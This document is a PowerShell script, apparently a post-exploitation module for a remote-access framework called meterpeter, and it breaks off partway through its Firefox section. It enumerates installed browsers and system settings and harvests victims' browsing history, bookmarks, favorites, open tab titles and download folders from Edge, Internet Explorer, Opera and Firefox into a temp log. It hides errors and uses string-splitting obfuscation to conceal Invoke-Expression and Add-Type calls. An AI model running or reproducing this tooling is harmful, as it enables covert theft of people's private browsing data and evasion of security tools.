
$Path = $null
$mpset = $False
$RUIUIUi0 = 'no'
$cmdletver = "1.20.7"
$IPATH = ($pwd).Path.ToString()
$param1 = $args[0] # User Inputs [Arguments]
$param2 = $args[1] # User Inputs [Arguments]
$host.UI.RawUI.WindowTitle = "@GetBrowsers v$cmdletver"
$ErrorActionPreference = "SilentlyContinue"

## Auto-Set @Args in case of User empty inputs (Set LogFile Path).
If(-not($param2)){$LogFilePath = "$env:TMP"}else{If($param2 -match '^[0-9]'){$LogFilePath = "$env:TMP";$param2 = $param2}else{$LogFilePath = "$param2";$mpset = $True}}
If(-not($param1)){
    ## Required (Mandatory) Parameters/args Settings
    echo "`nGetBrowsers - Enumerate installed browser(s) information ." > $LogFilePath\BrowserEnum.log
    echo "[ ERROR ] This script requires parameters (-args) to run ..`n" >> $LogFilePath\BrowserEnum.log
    echo "Syntax: [scriptname] [-arg <mandatory>] [arg <optional>]`n" >> $LogFilePath\BrowserEnum.log
    echo "The following mandatory args are available:" >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -RECON            Fast recon (browsers versions interface)" >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -WINVER           Enumerates remote sys default settings." >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -IE               Enumerates IE browser information Only." >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -ALL              Enumerates IE, Firefox, Chrome information." >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -CHROME           Enumerates Chrome browser information Only." >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -FIREFOX          Enumerates Firefox browser information Only." >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -OPERA            Enumerates Opera browser information Only." >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -ADDONS           Enumerates ALL browsers extentions installed." >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -CLEAN            Enumerates|Delete ALL browsers cache files.`n" >> $LogFilePath\BrowserEnum.log
    echo "The following Optional args are available:" >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -IE `$env:TMP      Enumerates browser and stores logfile to 'tmp'." >> $LogFilePath\BrowserEnum.log
    echo "./GetBrowsers.ps1 -SCAN 135,139,445 Enumerates local|remote host open|closed tcp ports.`n" >> $LogFilePath\BrowserEnum.log
    Get-Content $LogFilePath\BrowserEnum.log;Remove-Item $LogFilePath\BrowserEnum.log -Force
        ## For those who insiste in running this script outside meterpeter
        If(-not(Test-Path "$env:tmp\Update-KB4524147.ps1")){
            Start-Sleep -Seconds 6
        }
    Exit
}


## [GetBrowsers] PS Script Banner (Manual Run)
# For those who insiste in running this script outside meterpeter
#Write-Host "GetBrowsers - Enumerate installed browser(s) information." -ForeGroundColor Green
If($mpset -eq $True){Write-Host "[i] LogFile => $LogFilePath\BrowserEnum.log" -ForeGroundColor yellow}
Start-sleep -Seconds 1

If($param1 -ne "-CLEAN" -or $param1 -ne "-clean")
{
   ## Get Default network interface
   $DefaultInterface = Test-NetConnection -ErrorAction SilentlyContinue|Select-Object -expandproperty InterfaceAlias
   If(-not($DefaultInterface) -or $DefaultInterface -eq $null){$DefaultInterface = "{null}"}

   ## Get System Default Configurations
   $RHserver = "LogonServer  : "+"$env:LOGONSERVER"
   $Caption = Get-CimInstance Win32_OperatingSystem|Format-List *|findstr /I /B /C:"Caption"
   If($Caption){$ParseCap = $Caption -replace '                                   :','      :'}else{$ParseCap = "Caption      : Not Found"}

   ## Get System Default webBrowser
   $DefaultBrowser = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\https\UserChoice' -ErrorAction SilentlyContinue).ProgId
   If($DefaultBrowser){$Parse_Browser_Data = $DefaultBrowser.split("-")[0] -replace 'URL','' -replace 'HTML','' -replace '.HTTPS',''}else{$Parse_Browser_Data = "Not Found"}
   $MInvocation = "WebBrowser   : "+"$Parse_Browser_Data"+" (PreDefined)";

   ## Get System UserAgent string
   $IntSet = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\internet settings" -Name 'User Agent' -ErrorAction SilentlyContinue|Select-Object 'User Agent'
   If($IntSet){$ParsingIntSet = $IntSet -replace '@{User Agent=','UserAgent    : ' -replace '}',''}else{$ParsingIntSet = "UserAgent    : Not Found"}

   ## Get Default Gateway IpAddress (IPV4)
   $RGateway = (Get-NetIPConfiguration|Foreach IPv4DefaultGateway -ErrorAction SilentlyContinue).NextHop
   If(-not($RGateway) -or $RGateway -eq $null){$RGateway = "{null}"}
   $nwINFO = Get-WmiObject -ComputerName (hostname) Win32_NetworkAdapterConfiguration|Where-Object { $_.IPAddress -ne $null }
   $DHCPName = $nwINFO.DHCPEnabled;$ServiceName = $nwINFO.ServiceName

   ## Internet statistics
   $recstats = netstat -s -p IP|select-string -pattern "Packets Received"
   If($recstats){$statsdata = $recstats -replace '  Packets Received                   =','TCPReceived  :'}else{$statsdata = "TCPReceived  : {null}"}
   $delstats = netstat -s -p IP|select-string -pattern "Packets Delivered"
   If($delstats){$deliverdata = $delstats -replace '  Received Packets Delivered         =','TCPDelivered :'}else{$deliverdata = "TCPDelivered : {null}"}


   ## Writting LogFile to the selected path in: { $param2 var }
   echo "`n`nSystem Defaults" > $LogFilePath\BrowserEnum.log
   echo "---------------" >> $LogFilePath\BrowserEnum.log
   echo "DHCPEnabled  : $DHCPName" >> $LogFilePath\BrowserEnum.log
   echo "Interface    : $DefaultInterface" >> $LogFilePath\BrowserEnum.log
   echo "ServiceName  : $ServiceName" >> $LogFilePath\BrowserEnum.log
   echo "$RHserver" >> $LogFilePath\BrowserEnum.log
   echo "$ParseCap" >> $LogFilePath\BrowserEnum.log 
   echo "$ParsingIntSet" >> $LogFilePath\BrowserEnum.log

   ## Get Flash Internal Name/Version
   If(-not(Test-Path "$env:WINDIR\system32\macromed\flash\flash.ocx")){
       echo "flashName    : Not Found" >> $LogFilePath\BrowserEnum.log
   }else{
       $flash = Get-Item "$env:WINDIR\system32\macromed\flash\flash.ocx"|select *
       $flashName = $flash.versioninfo.InternalName
       echo "flashName    : $flashName" >> $LogFilePath\BrowserEnum.log
   }

   echo "$MInvocation" >> $LogFilePath\BrowserEnum.log
   echo "Gateway      : $RGateway" >> $LogFilePath\BrowserEnum.log
   echo "$statsdata" >> $LogFilePath\BrowserEnum.log
   echo "$deliverdata" >> $LogFilePath\BrowserEnum.log
   ## END Off { @args -WINVER }
}


function ConvertFrom-Json20([object] $item){
    $RawString = "Ad"+"d-Ty"+"pe -Ass"+"emblyNa"+"me System.W"+"eb.Ext"+"ensions" -Join ''
    $JavaSerial = "System.W"+"eb.Scri"+"pt.Serial"+"ization.Jav"+"aScriptSe"+"rializer" -Join ''
    $RawString|&('Sex' -replace 'S','I')
    $powers_js = New-Object $JavaSerial
    return ,$powers_js.DeserializeObject($item) 
}

function BROWSER_RECON {

    #Build output DataTable!
    $datatable = New-Object System.Data.DataTable
    $datatable.Columns.Add("Browser")|Out-Null
    $datatable.Columns.Add("Install")|Out-Null
    $datatable.Columns.Add("Status")|Out-Null
    $datatable.Columns.Add("Version")|Out-Null
    $datatable.Columns.Add("PreDefined")|Out-Null

    ## New MicrosoftEdge Update have changed the binary name to 'msedge' ..
    $fpatth = "HKLM:\SOFT"+"WARE\Microsoft\In"+"ternet Explorer" -join ''
    $CheckVersion = (Get-ItemProperty -Path "$fpatth" -EA SilentlyContinue).version.ToString()
    If($CheckVersion -lt '9.11.18362.0'){$ProcessName = "MicrosoftEdge"}else{$ProcessName = "msedge"}
    $IETestings = (Get-Process $ProcessName -ErrorAction SilentlyContinue).Responding
    If($IETestings -eq $True){$iStatus = "Active"}else{$iStatus = "Stoped"}
    $FFTestings = (Get-Process firefox -ErrorAction SilentlyContinue).Responding
    If($FFTestings -eq $True){$fStatus = "Active"}else{$fStatus = "Stoped"}
    $CHTestings = (Get-Process chrome -ErrorAction SilentlyContinue).Responding
    If($CHTestings -eq $True){$cStatus = "Active"}else{$cStatus = "Stoped"}
    $OStatus = (Get-Process opera -ErrorAction SilentlyContinue).Responding
    If($OStatus -eq $True){$OStatus = "Active"}else{$OStatus = "Stoped"}
    $sfStatus = (Get-Process safari -ErrorAction SilentlyContinue).Responding
    If($sfStatus -eq $True){$sfStatus = "Active"}else{$sfStatus = "Stoped"}
    $BrStatus = (Get-Process brave -ErrorAction SilentlyContinue).Responding
    If($BrStatus -eq $True){$BrStatus = "Active"}else{$BrStatus = "Stoped"}

    ## Detect ALL Available browsers Installed and the PreDefined browser name
    $DefaultBrowser = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\https\UserChoice' -ErrorAction SilentlyContinue).ProgId
    If($DefaultBrowser){$MInvocation = $DefaultBrowser.split("-")[0] -replace 'URL','' -replace 'HTML','' -replace '.HTTPS',''}else{$MInvocation = $null}
    $IEVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -ErrorAction SilentlyContinue).version
    If($IEVersion){$IEfound = "Found"}else{$IEfound = "False";$IEVersion = "{null}"}
    $Chrome_App = (Get-ItemProperty "HKCU:\Software\Google\Chrome\BLBeacon" -ErrorAction SilentlyContinue).version
    If($Chrome_App){$CHfound = "Found"}else{$CHfound = "False";$Chrome_App = "{null}"}
    $SafariData = (Get-ChildItem -Path "${Env:PROGRAMFILES(X86)}\Safari\Safari.exe" -EA SilentlyContinue).VersionInfo.ProductVersion.ToString()
    If($SafariData){$SFfound = "Found"}else{$SFfound = "False";$SafariData = "{null}"}
    $BraveData = (Get-ChildItem -Path "$Env:PROGRAMFILES\BraveSoftware\Brave-Browser\Application\brave.exe" -EA SilentlyContinue).VersionInfo.ProductVersion.ToString()
    If($BraveData){$Brfound = "Found"}else{$Brfound = "False";$BraveData = "{null}"}

    #Check Opera versions number
    If($MInvocation -iMatch 'Opera')
    {
       $OPfound = "Found"
       If(Test-Path -Path "$Env:LOCALAPPDATA\Programs" -Filter "Opera???" -EA SilentlyContinue)
       {
          $OPData = (Get-ChildItem -Path "$Env:LOCALAPPDATA\Programs\Opera???\launcher.exe").VersionInfo.ProductVersion.ToString()
       }
       Else{$OPData = "{null}"}
    }
    Else
    {
       $OPfound = "False"
    }


    ## display predefined browser status
    If($MInvocation -iMatch 'IE'){$id = "True";$fd = "False";$cd = "False";$OP = "False";$SF = "False";$Br = "False"}
    If($MInvocation -iMatch 'brave'){$id = "False";$fd = "False";$cd = "False";$OP = "False";$SF = "False";$Br = "True"}
    If($MInvocation -iMatch 'Opera'){$id = "False";$fd = "False";$cd = "False";$OP = "True";$SF = "False";$Br = "False"}
    If($MInvocation -iMatch 'Safari'){$id = "False";$fd = "False";$cd = "False";$OP = "False";$SF = "True";$Br = "False"}
    If($MInvocation -iMatch 'Chrome'){$id = "False";$fd = "False";$cd = "True";$OP = "False";$SF = "False";$Br = "False"}
    If($MInvocation -iMatch 'Firefox'){$id = "False";$fd = "True";$cd = "False";$OP = "False";$SF = "False";$Br = "False"}
    If($MInvocation -iMatch 'MSEdgeHTM'){$id = "True";$fd = "False";$cd = "False";$OP = "False";$SF = "False";$Br = "False"}
    If(-not($MInvocation) -or $MInvocation -eq $null){$id = "{Null}";$fd = "{Null}";$cd = "{Null}";$OP = "{Null}";$SF = "{Null}";$Br = "{Null}"}

    ## leak Firefox installed version
    If(-not(Test-Path -Path "$env:APPDATA\Mozilla\Firefox\Profiles"))
    {
        $FFfound = "False";
        $ParsingData = "{null}"
    }
    Else
    {
        $FFfound = "Found"
        If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\prefs.js"))
        {
            If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\prefs.js"))
            {
                $ParsingData = "{null}"
            }
            Else
            {
                $Preferencies = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\prefs.js"
                $JsPrefs = Get-content $Preferencies|Select-String "extensions.lastPlatformVersion"
                $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',','' -replace '\);','' -replace 'extensions.lastPlatformVersion','' -replace ' ',''
            }
        }
        Else
        {
            $Preferencies = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\prefs.js"
            $JsPrefs = Get-content $Preferencies|Select-String "extensions.lastPlatformVersion"
            $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',','' -replace '\);','' -replace 'extensions.lastPlatformVersion','' -replace ' ',''
        }
    }

    #Adding values to output DataTable!
    $ParsingData = (gp HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |Select DisplayName, DisplayVersion|?{$_.DisplayName -iMatch 'Firefox'}).DisplayVersion
    $datatable.Rows.Add("IE","$IEfound","$iStatus","$IEVersion","$id")|Out-Null
    $datatable.Rows.Add("CHROME","$CHfound","$cStatus","$Chrome_App","$cd")|Out-Null
    $datatable.Rows.Add("FIREFOX","$FFfound","$fStatus","$ParsingData","$fd")|Out-Null
    $datatable.Rows.Add("OPERA","$OPfound","$OStatus","$OPData","$OP")|Out-Null
    $datatable.Rows.Add("SAFARI","$SFfound","$sfStatus","$SafariData","$SF")|Out-Null
    $datatable.Rows.Add("BRAVE","$Brfound","$BrStatus","$BraveData","$Br")|Out-Null
    $datatable|Format-Table -AutoSize|Out-File -FilePath "$LogFilePath\BrowserEnum.log" -Force

    ## Get-NetAdapter { Interfaces Available }
    $Interfaces = Get-NetAdapter | Select-Object Status,InterfaceDescription -EA SilentlyContinue
    If($Interfaces){echo $Interfaces >> $LogFilePath\BrowserEnum.log}
}


function OPERA {
    ## Retrieve Opera Browser Information
    echo "`n`nOpera Browser" >> $LogFilePath\BrowserEnum.log
    echo "-------------" >> $LogFilePath\BrowserEnum.log

    ## Set the Location of Opera prefs.js file
    If(Test-Path "$Env:LOCALAPPDATA\Programs\Opera???\installer_prefs.json")
    {
        ## Check browser: { active|StartTime|PID } Settings
        $FFTestings = (Get-Process Opera -ErrorAction SilentlyContinue).Responding
        If($FFTestings -eq $True){
            $Status = "Status       : Active"
            $BsT = Get-Process Opera|Select -ExpandProperty StartTime
            $StartTime = $BsT[0];$FinalOut = "StartTime    : $StartTime"
            $PPID = (Get-Process Opera|Select -Last 1).Id

            echo "$Status" >> $LogFilePath\BrowserEnum.log
            echo "$FinalOut" >> $LogFilePath\BrowserEnum.log
            echo "Process PID  : $PPID" >> $LogFilePath\BrowserEnum.log
        }else{
            $Status = "Status       : Stoped"
            $PSID = "Process PID  : {requires Opera process running}"
            $FinalOut = "StartTime    : {requires Opera process running}"
            echo "$Status" >> $LogFilePath\BrowserEnum.log
            echo "$FinalOut" >> $LogFilePath\BrowserEnum.log
            echo "$PSID" >> $LogFilePath\BrowserEnum.log
        }

        ## Get Browser Version { 76.0.11 }
        $OperaVersionData = (Get-ChildItem -Path "$Env:LOCALAPPDATA\Programs\Opera???\launcher.exe").VersionInfo.ProductVersion.ToString()
        If($OperaVersionData)
        {
           echo "Version      : $OperaVersionData" >> $LogFilePath\BrowserEnum.log
        }
        Else
        {
           echo "Version      : {fail retriving version from launcher.exe}" >> $LogFilePath\BrowserEnum.log        
        }

        ## Get Opera.exe binary path
        $BinaryPath = Get-Process Opera -EA SilentlyContinue|Select -Last 1
        If(-not($BinaryPath) -or $BinaryPath -eq $null)
        {
            echo "BinaryPath   : {requires Opera process running}" >> $LogFilePath\BrowserEnum.log
        }
        Else
        {
            $BinaryPath = Get-Process Opera|Select -ExpandProperty Path
            $parseData = $BinaryPath[0]
            echo "BinaryPath   : $parseData" >> $LogFilePath\BrowserEnum.log
        }

        ## Get brownser startup page { https://www.google.pt }
        $JsPrefs = Get-content "$Env:LOCALAPPDATA\Programs\Opera???\installer_prefs.json" -EA SilentlyContinue
        If($JsPrefs)
        {
            $ParseData = $JsPrefs -split(',');$Strip = $ParseData[38]
            $ParsingData = $Strip -replace '\"}','' -replace '"}','' -replace '\"welcome-url\":\"','HomePage     : '
            echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
        }
        Else
        {
            $ParsingData = "HomePage     : {fail to retrieve Browser HomePage}"
            echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
        }


        ## Get Opera Last Active Tab windowsTitle
        echo "`nActive Browser Tab" >> $LogFilePath\BrowserEnum.log
        echo "------------------" >> $LogFilePath\BrowserEnum.log
        $checkProcess = Get-Process Opera -EA SilentlyContinue
        If(-not($checkProcess))
        {
            echo "{requires Opera process running}" >> $LogFilePath\BrowserEnum.log
        }
        Else
        {
            $StoreData = (Get-Process Opera).MainWindowTitle
            $ParseData = $StoreData | where {$_ -ne ""}
            $MyPSObject = $ParseData -replace '- Opera',''
            echo "$MyPSObject" >> $LogFilePath\BrowserEnum.log
        }

        #Get browser bookmarks
        echo "`nOpera Bookmarks" >> $LogFilePath\BrowserEnum.log
        echo "---------------" >> $LogFilePath\BrowserEnum.log
        $GETbooks = (Get-ChildItem "$Env:APPDATA\Opera Software\Opera*" -Recurse -Force -Filter "Bookmarks").FullName
        If($GETbooks)
        {
            $JsPrefs = Get-content "$GETbooks" -ErrorAction SilentlyContinue|Select-String "`"url`":"
            $ParsingData = $JsPrefs -replace '"url":','' -replace '"','' -replace ' ',''
            echo $ParsingData >> $LogFilePath\BrowserEnum.log             
        }
        Else
        {
            $ParsingData = "{Could not find any Bookmarks}"
            echo "$ParsingData" >> $LogFilePath\BrowserEnum.log        
        }
    
    }
    Else
    {
        echo "{Could not find any Browser Info}" >> $LogFilePath\BrowserEnum.log    
    }

}


function IE_Dump {
    ## Retrieve IE Browser Information
    echo "`n`nIE Browser" >> $LogFilePath\BrowserEnum.log
    echo "----------" >> $LogFilePath\BrowserEnum.log
    ## New MicrosoftEdge Update have changed the binary name to 'msedge' ..
    $CheckVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -ErrorAction SilentlyContinue).version
    If($CheckVersion -lt '9.11.18362.0'){$ProcessName = "MicrosoftEdge"}else{$ProcessName = "msedge"}
    $IEVersion = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -Name 'Version' -ErrorAction SilentlyContinue|Select-Object 'Version'
    If(-not($IEVersion) -or $IEVersion -eq $null){
        echo "{Could not find any Browser Info}" >> $LogFilePath\BrowserEnum.log
    }else{
        $IEData = $IEVersion -replace '@{Version=','Version      : ' -replace '}',''
        $RegPrefs = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\Main\" -Name 'start page'|Select-Object 'Start Page'
        $ParsingData = $RegPrefs -replace '@{Start Page=','HomePage     : ' -replace '}',''
        $LocalPage = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\Main\" -Name 'Search Page'|Select-Object 'Search Page'
        $ParsingLocal = $LocalPage -replace '@{Search Page=','SearchPage   : ' -replace '}',''
        $IntSet = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\internet settings" -Name 'User Agent'|Select-Object 'User Agent'
        $ParsingIntSet = $IntSet -replace '@{User Agent=','UserAgent    : ' -replace '}',''
        $DownloadDir = Get-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "{374DE290-123F-4565-9164-39C4925E467B}"|findstr /I /C:"Downloads"
        $ParseDownload = $DownloadDir -replace '{374DE290-123F-4565-9164-39C4925E467B} :','Downloads    :'
        $logfilefolder = (Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders").Cache
        $dataparse = "INetCache    : "+"$logfilefolder"

        $IETestings = (Get-Process -Name "$ProcessName" -EA SilentlyContinue).Responding
        If(-not($IETestings) -or $IETestings -eq $null){
            $Status = "Status       : Stoped"
            $PSID = "Process PID  : {requires $ProcessName process running}"
            $FinalOut = "StartTime    : {requires $ProcessName process running}"
        }else{
            $Status = "Status       : Active"
            $BrowserStartTime = (Get-Process -Name "$ProcessName").StartTime.ToString()
            $StartTime = $BrowserStartTime[0];$FinalOut = "StartTime    : $StartTime"
            $ProcessPID = (Get-Process -Name "$ProcessName"|Select -Last 1).Id.ToString()
            $PSID = "Process PID  : $ProcessPID"
        }

        ## Writting LogFile to the selected path in: { $param2 var }
        echo "$Status" >> $LogFilePath\BrowserEnum.log
        echo "$IEData" >> $LogFilePath\BrowserEnum.log
        echo "$ParseDownload" >> $LogFilePath\BrowserEnum.log
        echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
        echo "$ParsingLocal" >> $LogFilePath\BrowserEnum.log
        echo "$dataparse" >> $LogFilePath\BrowserEnum.log
    }

    <#
    $BinaryPathName = Get-Process $ProcessName -ErrorAction SilentlyContinue
    If(-not($BinaryPathName) -or $BinaryPathName -eq $null){
        echo "BinaryPath   : {requires $ProcessName process running}" >> $LogFilePath\BrowserEnum.log
    }else{
        $BinaryPathName = (Get-Process -Name $ProcessName).Path.ToString()
        $parseData = $BinaryPathName[0]
        echo "BinaryPath   : $parseData" >> $LogFilePath\BrowserEnum.log
    }

    ## leak From previous Functions { StartTime|PID }
    echo "$FinalOut" >> $LogFilePath\BrowserEnum.log
    echo "$PSID" >> $LogFilePath\BrowserEnum.log

    #>
    ## leak IE Last Active Tab windowsTitle
    echo "`nActive Browser Tab" >> $LogFilePath\BrowserEnum.log
    echo "------------------" >> $LogFilePath\BrowserEnum.log
    $checkProcess = Get-Process $ProcessName -ErrorAction SilentlyContinue
    If(-not($checkProcess) -or $checkProcess -eq $null){
        echo "{requires $ProcessName process running}`n" >> $LogFilePath\BrowserEnum.log
    }else{
        $StoreData = Get-Process $ProcessName | Select -ExpandProperty MainWindowTitle
        $ParseData = $StoreData | where {$_ -ne ""}
        $MyPSObject = $ParseData -replace '- Microsoft? Edge',''
        echo "$MyPSObject`n" >> $LogFilePath\BrowserEnum.log
    }

    ## Retrieve IE history URLs
    # "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
    # Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Internet Explorer\TypedURLs"
    echo "`nIE History" >> $LogFilePath\BrowserEnum.log
    echo "----------" >> $LogFilePath\BrowserEnum.log
    If(-not(Test-Path -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History")){
        ## Retrieve History from ie`xplorer if not found MsEdge binary installation ..
        $Finaltest = Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Internet Explorer\TypedURLs" -ErrorAction SilentlyContinue
        If(-not($Finaltest) -or $Finaltest -eq $null){
            echo "{Could not find any History}" >> $LogFilePath\BrowserEnum.log
        }else{
            Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Internet Explorer\TypedURLs"|findstr /B /I "url" >> $LogFilePath\BrowserEnum.log
        }
    }else{
        $Regex = '([a-zA-Z]{3,})://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
        $MsEdgeHistory = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
        Get-Content "$MsEdgeHistory"|Select-String -Pattern $Regex -AllMatches | % { $_.Matches } | % { $_.Value } | Sort-Object -Unique >> $LogFilePath\BrowserEnum.log
    }

    ## Retrieve IE Favorites
    echo "`nIE Favorites" >> $LogFilePath\BrowserEnum.log
    echo "------------" >> $LogFilePath\BrowserEnum.log
    If(-not(Test-Path "$env:LOCALAPPDATA\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\MicrosoftEdge\User\Default\Favorites\*")){
        If(-not(Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Last Tabs")){
            echo "{Could not find any Favorites}" >> $LogFilePath\BrowserEnum.log
        }else{
            $LocalDirPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Last Tabs"
            $ParseFileData = Get-Content "$LocalDirPath"|findstr /I /C:"http" /I /C:"https"
            $DumpFileData = $ParseFileData -replace '[^a-zA-Z/:. ]',''
            ForEach ($Token in $DumpFileData){
                $Token = $Token -replace ' ',''
                echo "`n" $Token >> $LogFilePath\BrowserEnum.log
            }        
        }

    }else{

        $LocalDirPath = "$env:LOCALAPPDATA\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\MicrosoftEdge\User\Default\Favorites\*"
        $DumpFileData = Get-Content "$LocalDirPath" -Raw|findstr /I /C:"http" /C:"https" # Test.txt and test2.txt (test Files) ..
        ForEach ($Token in $DumpFileData){
            $Token = $Token -replace ' ',''
            echo $Token >> $LogFilePath\BrowserEnum.log
        }
    }

    ## Retrieve IE Bookmarks
    echo "`nIE Bookmarks" >> $LogFilePath\BrowserEnum.log
    echo "------------" >> $LogFilePath\BrowserEnum.log
    If(-not(Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Bookmarks")){
        ## Leaking ie`xplore
        $URLs = Get-ChildItem -Path "$Env:SYSTEMDRIVE\Users\" -Filter "*.url" -Recurse -ErrorAction SilentlyContinue
        ForEach ($URL in $URLs){
            if ($URL.FullName -match 'Favorites'){
                $User = $URL.FullName.split('\')[2]
                Get-Content -Path $URL.FullName|ForEach-Object {
                    try {
                        if ($_.StartsWith('URL')){
                            ## parse the .url body to extract the actual bookmark location
                            $URL = $_.Substring($_.IndexOf('=') + 1)
                                if($URL -match $Search){
                                    echo "$URL" >> $LogFilePath\BrowserEnum.log
                                }
                        }
                    }
                    catch {
                        echo "Error parsing url: $_" >> $LogFilePath\BrowserEnum.log
                    }
                }
            }
        }

    }else{
        ## Leaking msedge 
        $LocalDirPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Bookmarks"
        $DumpFileData = Get-Content "$LocalDirPath" -Raw|findstr /I /C:"http" /C:"https"
        ForEach ($Token in $DumpFileData){
            $Token = $Token -replace '"','' -replace 'url:','' -replace ' ',''
            echo $Token >> $LogFilePath\BrowserEnum.log
        }
    }
}


function FIREFOX {
    ## Retrieve FireFox Browser Information
    echo "`n`nFireFox Browser" >> $LogFilePath\BrowserEnum.log
    echo "---------------" >> $LogFilePath\BrowserEnum.log

    ## Set the Location of firefox prefs.js file
    If(Test-Path "$Env:APPDATA\Mozilla\Firefox\Profiles"){

        ## Check browser: { active|StartTime|PID } Settings
        $FFTestings = (Get-Process Firefox -ErrorAction SilentlyContinue).Responding
        If($FFTestings -eq $True){
            $Status = "Status       : Active"
            $BsT = Get-Process Firefox|Select -ExpandProperty StartTime
            $StartTime = $BsT[0];$FinalOut = "StartTime    : $StartTime"
            echo "$Status" >> $LogFilePath\BrowserEnum.log
        }else{
            $Status = "Status       : Stoped"
            $PSID = "Process PID  : {requires Firefox process running}"
            $FinalOut = "StartTime    : {requires Firefox process running}"
            echo "$Status" >> $LogFilePath\BrowserEnum.log
            echo "$PSID" >> $LogFilePath\BrowserEnum.log
            echo "$FinalOut" >> $LogFilePath\BrowserEnum.log
        }

        ## Get Browser Version { 76.0.11 }
        If(-not(Test-Path -Path "$env:APPDATA\Mozilla\Firefox\Profiles"))
        {
            $ParsingData = "{null}"
        }
        Else
        {
            If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\prefs.js"))
            {
                If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\prefs.js"))
                {
                    $ParsingData = "{null}"
                }
                Else
                {
                    $stupidTrick = $True
                    $FirefoxProfile = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\prefs.js"
                    $JsPrefs = Get-content $FirefoxProfile|Select-String "extensions.lastPlatformVersion"
                    $ParsingData = $JsPrefs -replace 'user_pref\(','' -replace '\"','' -replace ',','' -replace '\);','' -replace 'extensions.lastPlatformVersion','' -replace ' ',''
                }
            }
            Else
            {
                $FirefoxProfile = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\prefs.js"
                $JsPrefs = Get-content $FirefoxProfile|Select-String "extensions.lastPlatformVersion"
                $ParsingData = $JsPrefs -replace 'user_pref\(','' -replace '\"','' -replace ',','' -replace '\);','' -replace 'extensions.lastPlatformVersion','' -replace ' ',''
            }
        }
        #add data to logfile
        echo "Version      : $ParsingData" >> $LogFilePath\BrowserEnum.log


        ## Get brownser startup page { https://www.google.pt }
        $JsPrefs = Get-content "$FirefoxProfile" -ErrorAction SilentlyContinue|Select-String "browser.startup.homepage"
        If($stupidTrick -eq $True)
        {
            $ParseData = $JsPrefs -split(';');$Strip = $ParseData[0]
            $ParsingData = $Strip -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\)','' -replace 'browser.startup.homepage',''
            echo "HomePage     $ParsingData" >> $LogFilePath\BrowserEnum.log
        }
        Else
        {
            If($ParsingData -iMatch '{null}')
            {
               $ParsingData = "  {null}"
            }
            Else
            {
               $ParsingData = $JsPrefs[0] -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'browser.startup.homepage',''
            }
            echo "HomePage     $ParsingData" >> $LogFilePath\BrowserEnum.log

        }

        ## Get browser.download.dir { C:\Users\pedro\Desktop }
        $JsPrefs = Get-Content "$FirefoxProfile" -ErrorAction SilentlyContinue|Select-String "browser.download.dir";
        If(-not($JsPrefs) -or $JsPrefs -eq $null){
            ## Test with browser.download.lastDir
            $JsPrefs = Get-Content "$FirefoxProfile" -ErrorAction SilentlyContinue|Select-String "browser.download.lastDir"
            If(-not($JsPrefs) -or $JsPrefs -eq $null){
                echo "Downloads    : {null}" >> $LogFilePath\BrowserEnum.log
            }else{
                $ParsingData = $JsPrefs -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'browser.download.lastDir','Downloads    '
                If($ParsingData -match '\\\\'){$ParsingData = $ParsingData -replace '\\\\','\'}
